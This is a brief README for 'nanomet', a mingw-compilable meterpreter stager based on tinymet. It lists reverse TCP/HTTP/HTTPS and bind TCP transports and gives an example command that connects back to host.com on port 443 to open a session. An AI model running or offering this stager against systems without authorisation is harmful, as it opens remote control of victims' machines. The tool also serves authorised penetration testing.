nanomet
=======

A "nano" meterpreter stager.  Copyright (c) 2014, Vlatko Kosturjak - kost
nanomet is tinymet modified to support compiling using mingw compilers.

Based on tinymet by Copyright (c) 2014, Sherif Eldeeb "eldeeb.net"
please visit http://tinymet.com for details

Usage
=======

Usage: nanomet.exe [transport] LHOST LPORT

Available transports are as follows:

* 0: reverse_tcp
* 1: reverse_http
* 2: reverse_https
* 3: bind_tcp

Example
========

nanomet.exe 2 host.com 443

will use reverse_https and connect to host.com:443


